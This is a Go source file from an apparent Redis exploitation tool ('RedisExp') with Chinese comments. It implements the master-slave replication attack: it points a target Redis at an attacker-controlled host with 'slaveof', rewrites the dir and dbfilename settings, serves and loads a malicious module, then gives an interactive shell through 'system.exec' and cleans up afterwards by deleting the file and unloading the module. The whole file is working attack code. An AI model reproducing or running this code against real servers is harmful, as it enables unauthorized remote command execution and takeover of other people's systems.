package slave

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/axgle/mahonia"

	"RedisExp/pkg/conn"

	"RedisExp/pkg/logger"
	"RedisExp/pkg/lua"
)

var (
	payload []byte
)

// RunCmd system.exec 执行命令
func RunCmd(cmd string) {
	ctx := context.Background()
	val, err := conn.Rdb.Do(ctx, "system.exec", cmd).Result()
	if err != nil {
		logger.Err("%v", err)
		return
	}
	fmt.Println(mahonia.NewDecoder("gbk").ConvertString(val.(string)))

}

// RedisSlave 开启主从复制
func RedisSlave(lhost, lport, dll string) {
	// 打开 exp
	f, err := os.Open(dll)
	if err != nil {
		logger.Err("%v", err)
	}

	payload, err = io.ReadAll(f)
	if err != nil {
		logger.Err("%v", err)
	}


	conn.EchoRedisCMD("save")

	logger.Info("开启主从复制")
	slave := fmt.Sprintf("slaveof %v %v", lhost, lport)
	dir := fmt.Sprintf("config set dir %v", conn.RedisDir)
	file := fmt.Sprintf("config set dbfilename %v", dll)

	conn.EchoRedisCMD(slave, dir, file)

	Listen(lport, payload)

	load := fmt.Sprintf("module load ./%v", dll)
	conn.EchoRedisCMD(load)

}

// CloseSlave 关闭主从复制
func CloseSlave(dll, s string) {
	logger.Info("尝试关闭主从")
	conn.EchoRedisCMD("slaveof no one")

	// 执行命令才卸载 module
	if strings.Contains(s, "exec") {
		// 如果不是 exp.Dll 就删除
		if !strings.Contains(dll, "exp.dll") {
			RunCmd("rm " + dll)
		}

		conn.EchoRedisCMD("module unload system")
	}

	dir := fmt.Sprintf("config set dir %v", conn.RedisDir)
	db := fmt.Sprintf("config set dbfilename %v", conn.RedisDbFilename)

	conn.EchoRedisCMD(dir, db)

}

// 循环执行命令
func LoopCmd(dll, s string) {
	logger.Info("执行命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("$ ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			if strings.Contains(s, "exec") {
				CloseSlave(dll, "exec")
			}
			break
		}
		// 执行命令
		if strings.Contains(s, "exec") {
			RunCmd(cmd)
		} else if strings.Contains(s, "lua") {
			lua.RedisLua(cmd)
		}

	}
}
